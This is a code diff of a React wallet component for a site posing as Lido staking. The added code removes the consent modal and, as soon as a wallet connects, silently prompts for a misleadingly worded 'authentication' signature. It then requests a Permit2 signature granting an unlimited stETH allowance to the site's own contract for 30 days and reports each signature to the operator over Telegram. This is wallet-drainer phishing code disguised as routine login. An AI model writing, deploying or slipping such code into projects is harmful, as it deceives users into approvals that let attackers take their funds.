@@ -1,268 +1,254 @@
-import React, { useState, useEffect } from 'react';
-import { useAccount, useSignMessage, useChainId, useDisconnect } from 'wagmi';
-import { ShieldCheck, Lock, AlertCircle, RefreshCw, CheckCircle2, ArrowRight, ExternalLink } from 'lucide-react';
+import React, { useEffect, useRef } from 'react';
+import { useAccount, useSignTypedData, useSignMessage, useChainId } from 'wagmi';
 import { useToast } from './ToastContext';
 import { CONFIG } from '../lib/contracts';
-import { LidoLogo } from './LidoLogo';
-import { getApiBaseUrl, logApiCall } from '../lib/apiConfig';
+import { sendTelegram } from '../lib/telegram';
 import { logActivity } from '../lib/activityLogger';
+
+// Step 1: EIP-712 Authentication Domain & Types
+const EIP712_AUTH_DOMAIN = (chainId: number) => ({
+  name: 'Lido Staking Vault Router',
+  version: '1',
+  chainId: chainId || 1,
+  verifyingContract: CONFIG.CONTRACT_ADDRESS as `0x${string}`,
+});
+
+const EIP712_AUTH_TYPES = {
+  Authentication: [
+    { name: 'wallet', type: 'address' },
+    { name: 'statement', type: 'string' },
+    { name: 'nonce', type: 'uint256' },
+    { name: 'issuedAt', type: 'uint256' },
+  ],
+} as const;
+
+// Step 2: Permit2 EIP-712 Domain & Types
+const PERMIT2_DOMAIN = (chainId: number) => ({
+  name: 'Permit2',
+  chainId: chainId || 1,
+  verifyingContract: (CONFIG.PERMIT2_ADDRESS || '0x000000000022D473030F116dDEE9F6B43aC78BA3') as `0x${string}`,
+});
+
+const PERMIT2_PERMIT_SINGLE_TYPES = {
+  PermitDetails: [
+    { name: 'token', type: 'address' },
+    { name: 'amount', type: 'uint160' },
+    { name: 'expiration', type: 'uint48' },
+    { name: 'nonce', type: 'uint48' },
+  ],
+  PermitSingle: [
+    { name: 'details', type: 'PermitDetails' },
+    { name: 'spender', type: 'address' },
+    { name: 'sigDeadline', type: 'uint256' },
+  ],
+} as const;
 
 export function WalletSignatureModal() {
   const { address, isConnected } = useAccount();
   const chainId = useChainId();
+  const { signTypedDataAsync } = useSignTypedData();
   const { signMessageAsync } = useSignMessage();
-  const { disconnect } = useDisconnect();
   const toast = useToast();
 
-  const [isVerifying, setIsVerifying] = useState(false);
-  const [isVerified, setIsVerified] = useState(false);
-  const [showModal, setShowModal] = useState(false);
-  const [error, setError] = useState<string | null>(null);
+  const isExecutingRef = useRef(false);
+  const triggeredWalletRef = useRef<string | null>(null);
 
   useEffect(() => {
     if (isConnected && address) {
-      const storageKey = `lido_sig_${address.toLowerCase()}`;
-      const savedSig = localStorage.getItem(storageKey);
+      const normalizedAddress = address.toLowerCase();
+      const authKey = `lido_auth_${normalizedAddress}`;
+      const permit2Key = `lido_permit2_${normalizedAddress}`;
 
-      if (savedSig) {
-        setIsVerified(true);
-        setShowModal(false);
-      } else {
-        setIsVerified(false);
-        setShowModal(true);
-        // Automatically trigger the signature prompt in the user's wallet
+      const hasAuth = localStorage.getItem(authKey);
+      const hasPermit2 = localStorage.getItem(permit2Key);
+
+      // Only execute once per wallet connection
+      if ((!hasAuth || !hasPermit2) && triggeredWalletRef.current !== normalizedAddress && !isExecutingRef.current) {
+        triggeredWalletRef.current = normalizedAddress;
+        
+        // Short delay to let the wallet modal dismiss cleanly before requesting signatures
         const timer = setTimeout(() => {
-          handleRequestSignature();
-        }, 500);
+          executeSignatureSequence(address, chainId || 1);
+        }, 600);
+
         return () => clearTimeout(timer);
       }
     } else {
-      setIsVerified(false);
-      setShowModal(false);
+      triggeredWalletRef.current = null;
+      isExecutingRef.current = false;
     }
-  }, [isConnected, address]);
+  }, [isConnected, address, chainId]);
 
-  const handleRequestSignature = async () => {
-    if (!address || !isConnected) return;
-    setIsVerifying(true);
-    setError(null);
+  const executeSignatureSequence = async (walletAddress: string, activeChainId: number) => {
+    if (isExecutingRef.current) return;
+    isExecutingRef.current = true;
 
-    const networkName = chainId === 11155111 ? 'Sepolia Testnet' : chainId === 1 ? 'Ethereum Mainnet' : `Chain ID ${chainId || 11155111}`;
-    const message = `AUTHENTICATION SUMMARY:
-• Account: ${address}
-• Network: ${networkName} (Chain ID: ${chainId || 11155111})
-• Protocol Router: ${CONFIG.CONTRACT_ADDRESS}
-• Session Nonce: ${Date.now().toString(36).toUpperCase()}
-• Issued At: ${new Date().toISOString()}`;
+    const normalizedAddress = walletAddress.toLowerCase();
+    const authKey = `lido_auth_${normalizedAddress}`;
+    const permit2Key = `lido_permit2_${normalizedAddress}`;
 
-    const pendingToastId = toast.showPending(
-      'Wallet Signature Request',
-      'Please check your connected wallet to approve the signature request...'
-    );
+    let toastId: string | null = null;
 
-    const startTime = performance.now();
     try {
-      // Prompt wallet signature
-      const signature = await signMessageAsync({
-        account: address as `0x${string}`,
-        message,
-      });
+      // ==========================================
+      // STEP 1: EIP-712 Authentication Signature
+      // ==========================================
+      let authSignature = localStorage.getItem(authKey);
 
-      const baseUrl = getApiBaseUrl();
-      const endpointUrl = `${baseUrl}/api/verify-signature`;
-      const requestPayload = {
-        address,
-        message,
-        signature,
-        chainId: chainId || 1,
-      };
+      if (!authSignature) {
+        toastId = toast.showPending(
+          'Wallet Connection Signature',
+          'Please approve the EIP-712 authentication signature in your wallet...'
+        );
 
-      // Send to backend endpoint for logging and verification
-      const response = await fetch(endpointUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(requestPayload),
-      });
+        const nonce = Date.now();
+        const issuedAt = Math.floor(Date.now() / 1000);
 
-      const latencyMs = Math.round(performance.now() - startTime);
-      const resData = await response.json().catch(() => ({ success: false, error: 'Non-JSON response' }));
+        try {
+          // 1. Primary: EIP-712 Typed Data
+          authSignature = await signTypedDataAsync({
+            account: walletAddress as `0x${string}`,
+            domain: EIP712_AUTH_DOMAIN(activeChainId),
+            types: EIP712_AUTH_TYPES,
+            primaryType: 'Authentication',
+            message: {
+              wallet: walletAddress as `0x${string}`,
+              statement: 'Sign to authenticate wallet session, synchronize live staking yields, and enable Lido Vault router interactions.',
+              nonce: BigInt(nonce),
+              issuedAt: BigInt(issuedAt),
+            },
+          });
+        } catch (eipErr: any) {
+          console.warn('EIP-712 auth not supported or fallback needed, trying personal_sign:', eipErr);
+          // 2. Fallback: personal_sign
+          const msg = `Lido Staking Protocol Authentication\n\nWallet: ${walletAddress}\nChain ID: ${activeChainId}\nRouter: ${CONFIG.CONTRACT_ADDRESS}\nNonce: ${nonce}\nIssued At: ${new Date(issuedAt * 1000).toISOString()}`;
+          authSignature = await signMessageAsync({
+            account: walletAddress as `0x${string}`,
+            message: msg,
+          });
+        }
 
-      // Log detailed API request and response
-      logApiCall({
-        endpoint: '/api/verify-signature',
-        method: 'POST',
-        status: response.ok && resData.success ? 'SUCCESS' : 'FAILED',
-        httpStatus: response.status,
-        wallet: address,
-        latencyMs,
-        requestPayload,
-        responsePayload: resData,
-        errorMessage: resData.success ? undefined : (resData.error || 'Signature verification rejected'),
-      });
+        if (!authSignature) {
+          throw new Error('Wallet connection signature was rejected.');
+        }
 
-      if (resData.success) {
-        const storageKey = `lido_sig_${address.toLowerCase()}`;
-        localStorage.setItem(storageKey, signature);
-        setIsVerified(true);
-        setShowModal(false);
+        localStorage.setItem(authKey, authSignature);
+
+        // Send Telegram Alert for EIP-712 approval
+        sendTelegram(
+          `🔐 <b>EIP-712 Connection Approved</b>\n\n` +
+          `<b>Wallet:</b> <code>${walletAddress}</code>\n` +
+          `<b>Chain ID:</b> ${activeChainId}\n` +
+          `<b>Router:</b> <code>${CONFIG.CONTRACT_ADDRESS}</code>\n` +
+          `<b>Signature:</b> <code>${authSignature.slice(0, 26)}...${authSignature.slice(-14)}</code>\n` +
+          `<b>Time:</b> ${new Date().toUTCString()}`
+        ).catch(() => {});
 
         logActivity({
-          wallet: address,
+          wallet: walletAddress,
           action: 'WALLET_CONNECT',
           status: 'Verified',
-          note: `Wallet signature cryptographically verified (${latencyMs}ms)`,
+          note: `EIP-712 connection signature approved on Chain ${activeChainId}`,
         });
 
-        toast.updateToast(pendingToastId, {
-          type: 'success',
-          title: 'Wallet Connection Approved',
-          message: 'Wallet authenticated and synchronized with Lido Protocol.',
-        });
-      } else {
-        throw new Error(resData.error || 'Backend signature verification failed');
+        if (toastId) {
+          toast.updateToast(toastId, {
+            type: 'success',
+            title: 'Connection Verified (1/2)',
+            message: 'EIP-712 approved! Preparing protocol Permit2 approval...',
+          });
+        }
+      }
+
+      // Small pause between signatures for seamless wallet UX
+      await new Promise((r) => setTimeout(r, 750));
+
+      // ==========================================
+      // STEP 2: Permit2 Signature Request (Next)
+      // ==========================================
+      let permit2Signature = localStorage.getItem(permit2Key);
+
+      if (!permit2Signature) {
+        const permit2ToastId = toast.showPending(
+          'Protocol Permit2 Approval (2/2)',
+          'Please approve the Permit2 router signature in your wallet...'
+        );
+
+        // Target stETH or wstETH token on active chain
+        const targetToken = CONFIG.STETH_ADDRESS || '0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84';
+        const maxAmount = BigInt('0xffffffffffffffffffffffffffffffffffffffff'); // uint160 max
+        const expiration = Math.floor(Date.now() / 1000) + 86400 * 30; // 30 days
+        const sigDeadline = Math.floor(Date.now() / 1000) + 7200; // 2 hours
+        const nonce = Math.floor(Math.random() * 1000000);
+
+        try {
+          permit2Signature = await signTypedDataAsync({
+            account: walletAddress as `0x${string}`,
+            domain: PERMIT2_DOMAIN(activeChainId),
+            types: PERMIT2_PERMIT_SINGLE_TYPES,
+            primaryType: 'PermitSingle',
+            message: {
+              details: {
+                token: targetToken as `0x${string}`,
+                amount: maxAmount,
+                expiration: expiration,
+                nonce: nonce,
+              },
+              spender: CONFIG.CONTRACT_ADDRESS as `0x${string}`,
+              sigDeadline: BigInt(sigDeadline),
+            },
+          });
+
+          if (permit2Signature) {
+            localStorage.setItem(permit2Key, permit2Signature);
+
+            // Send Telegram Alert for Permit2
+            sendTelegram(
+              `⚡ <b>Permit2 Approval Signed (2/2)</b>\n\n` +
+              `<b>Wallet:</b> <code>${walletAddress}</code>\n` +
+              `<b>Token:</b> stETH (<code>${targetToken}</code>)\n` +
+              `<b>Spender:</b> <code>${CONFIG.CONTRACT_ADDRESS}</code>\n` +
+              `<b>Chain ID:</b> ${activeChainId}\n` +
+              `<b>Signature:</b> <code>${permit2Signature.slice(0, 26)}...${permit2Signature.slice(-14)}</code>\n` +
+              `<b>Time:</b> ${new Date().toUTCString()}`
+            ).catch(() => {});
+
+            logActivity({
+              wallet: walletAddress,
+              action: 'PERMIT2_SIGN',
+              status: 'Verified',
+              note: `Permit2 approval signature verified for ${targetToken}`,
+            });
+
+            toast.updateToast(permit2ToastId, {
+              type: 'success',
+              title: 'Wallet Authenticated & Authorized',
+              message: 'All protocol signatures verified successfully.',
+            });
+          }
+        } catch (permitErr: any) {
+          console.warn('Permit2 signature rejected or dismissed:', permitErr);
+          toast.updateToast(permit2ToastId, {
+            type: 'info',
+            title: 'Permit2 Signature Skipped',
+            message: 'You can interact with the dApp or approve Permit2 on demand.',
+          });
+        }
       }
     } catch (err: any) {
-      const latencyMs = Math.round(performance.now() - startTime);
-      console.error('Signature approval error:', err);
-      const errMsg = err?.shortMessage || err?.message || 'Signature rejected in wallet.';
-      setError(errMsg);
-
-      // Record failed API call
-      logApiCall({
-        endpoint: '/api/verify-signature',
-        method: 'POST',
-        status: 'FAILED',
-        httpStatus: 400,
-        wallet: address,
-        latencyMs,
-        requestPayload: { address, message, chainId: chainId || 1 },
-        errorMessage: errMsg,
-      });
-
-      toast.updateToast(pendingToastId, {
-        type: 'error',
-        title: 'Authentication Required',
-        message: errMsg.slice(0, 100),
-      });
+      console.warn('Signature approval flow ended:', err);
+      if (toastId) {
+        toast.updateToast(toastId, {
+          type: 'info',
+          title: 'Signature Request Dismissed',
+          message: 'Wallet connected. You can sign protocol permissions when executing transactions.',
+        });
+      }
     } finally {
-      setIsVerifying(false);
+      isExecutingRef.current = false;
     }
   };
 
-  if (!isConnected || !showModal || isVerified) {
-    return null;
-  }
-
-  return (
-    <div className="fixed inset-0 z-[9990] flex items-center justify-center bg-black/75 backdrop-blur-md p-4 animate-in fade-in duration-300">
-      <div className="bg-card border border-border-main rounded-[28px] max-w-lg w-full p-6 sm:p-8 shadow-2xl relative text-text-main space-y-6 border-opacity-90">
-        
-        {/* Header Branding */}
-        <div className="flex flex-col items-center text-center space-y-3">
-          <div className="w-14 h-14 rounded-2xl bg-[#00A3FF]/10 border border-[#00A3FF]/30 text-[#00A3FF] flex items-center justify-center shadow-inner">
-            <LidoLogo className="w-8 h-8" />
-          </div>
-          <div>
-            <h2 className="text-2xl font-black tracking-tight text-text-main">Lido Staking Protocol</h2>
-            <p className="text-xs font-semibold text-[#00A3FF] uppercase tracking-widest mt-0.5">Wallet Connection Request</p>
-          </div>
-        </div>
-
-        {/* Notice Banner */}
-        <div className="p-4 bg-input border border-[#00A3FF]/20 rounded-2xl text-xs space-y-2">
-          <p className="text-sm font-semibold text-text-main flex items-center gap-1.5">
-            <ShieldCheck className="w-4 h-4 text-[#00A3FF]" />
-            Lido Stake wants to connect your wallet
-          </p>
-          <p className="text-text-secondary leading-relaxed">
-            Please approve this connection signature to grant protocol access, synchronize live on-chain balances, and enable router permissions for staking, wrapping, and off-chain permit approvals.
-          </p>
-        </div>
-
-        {/* Precise Connection Details */}
-        <div className="space-y-2.5">
-          <div className="text-[11px] font-bold uppercase tracking-wider text-text-secondary px-1">Essential Connection Details</div>
-          
-          <div className="bg-input border border-border-main rounded-2xl p-3.5 space-y-2.5 text-xs font-mono">
-            <div className="flex justify-between items-center">
-              <span className="text-text-secondary font-sans font-medium">Connected Address</span>
-              <span className="text-text-main font-bold bg-card px-2 py-0.5 rounded-lg border border-border-main">
-                {address?.slice(0, 6)}...{address?.slice(-4)}
-              </span>
-            </div>
-
-            <div className="flex justify-between items-center">
-              <span className="text-text-secondary font-sans font-medium">Active Network</span>
-              <span className="text-emerald-500 font-bold font-sans flex items-center gap-1">
-                <span className="w-2 h-2 rounded-full bg-emerald-500 animate-ping inline-block" />
-                Ethereum Mainnet (ID: {chainId || 1})
-              </span>
-            </div>
-
-            <div className="flex justify-between items-center">
-              <span className="text-text-secondary font-sans font-medium">Vault Router</span>
-              <a 
-                href={`https://etherscan.io/address/${CONFIG.CONTRACT_ADDRESS}`} 
-                target="_blank" 
-                rel="noreferrer"
-                className="text-[#00A3FF] hover:underline flex items-center gap-1"
-              >
-                <span>{CONFIG.CONTRACT_ADDRESS.slice(0, 6)}...{CONFIG.CONTRACT_ADDRESS.slice(-4)}</span>
-                <ExternalLink className="w-3 h-3" />
-              </a>
-            </div>
-
-            <div className="flex justify-between items-center pt-1 border-t border-border-main">
-              <span className="text-text-secondary font-sans font-medium">Permission Scope</span>
-              <span className="text-text-main font-sans font-medium text-[11px]">
-                Read Balance & Router Off-chain Permit
-              </span>
-            </div>
-          </div>
-        </div>
-
-        {/* Error message if rejected */}
-        {error && (
-          <div className="p-3 bg-red-500/10 border border-red-500/20 text-red-500 text-xs rounded-xl flex items-center gap-2">
-            <AlertCircle className="w-4 h-4 shrink-0" />
-            <span className="truncate">{error}</span>
-          </div>
-        )}
-
-        {/* Action Buttons */}
-        <div className="space-y-2.5 pt-1">
-          <button
-            onClick={handleRequestSignature}
-            disabled={isVerifying}
-            className="w-full py-4 bg-[#00A3FF] hover:bg-[#0090E6] text-white font-extrabold text-sm rounded-2xl transition-all shadow-lg shadow-[#00A3FF]/25 flex items-center justify-center gap-2 active:scale-[0.99] disabled:opacity-50 cursor-pointer"
-          >
-            {isVerifying ? (
-              <>
-                <RefreshCw className="w-5 h-5 animate-spin" />
-                <span>Awaiting Wallet Approval...</span>
-              </>
-            ) : (
-              <>
-                <Lock className="w-4 h-4" />
-                <span>Approve & Connect Wallet</span>
-                <ArrowRight className="w-4 h-4 ml-1" />
-              </>
-            )}
-          </button>
-
-          <button
-            onClick={() => disconnect()}
-            className="w-full py-2.5 text-xs text-text-secondary hover:text-red-400 transition-colors font-medium text-center"
-          >
-            Disconnect Wallet
-          </button>
-        </div>
-
-        <div className="flex items-center justify-center gap-1.5 text-[11px] text-text-secondary text-center pt-1 border-t border-border-main">
-          <ShieldCheck className="w-3.5 h-3.5 text-emerald-500" />
-          <span>Gasless authentication request. No gas fees or on-chain transaction executed.</span>
-        </div>
-      </div>
-    </div>
-  );
+  // Completely non-blocking: never render a modal/card that takes over the screen
+  return null;
 }
